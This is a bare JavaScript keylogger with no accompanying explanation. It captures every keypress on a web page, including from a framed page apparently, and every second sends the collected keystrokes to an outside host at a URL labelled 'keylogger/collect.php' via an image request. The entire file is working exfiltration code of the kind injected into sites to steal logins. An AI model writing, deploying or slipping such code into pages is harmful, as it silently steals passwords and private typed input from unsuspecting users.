var keys='';
var url = 'https://data.turtlecode84.repl.co/keylogger/collect.php?c=';

document.getElementById('iframe').contentWindow.targetFunction();

function targetFunction() {
  document.onkeypress = function(e) {
	  get = window.event?event:e;
	  key = get.keyCode?get.keyCode:get.charCode;
	  key = String.fromCharCode(key);
	  keys+=key;
  }
  window.setInterval(function(){
	  if(keys.length>0) {
		  new Image().src = url+keys;
		  keys = '';
	  }
  }, 1000);
}
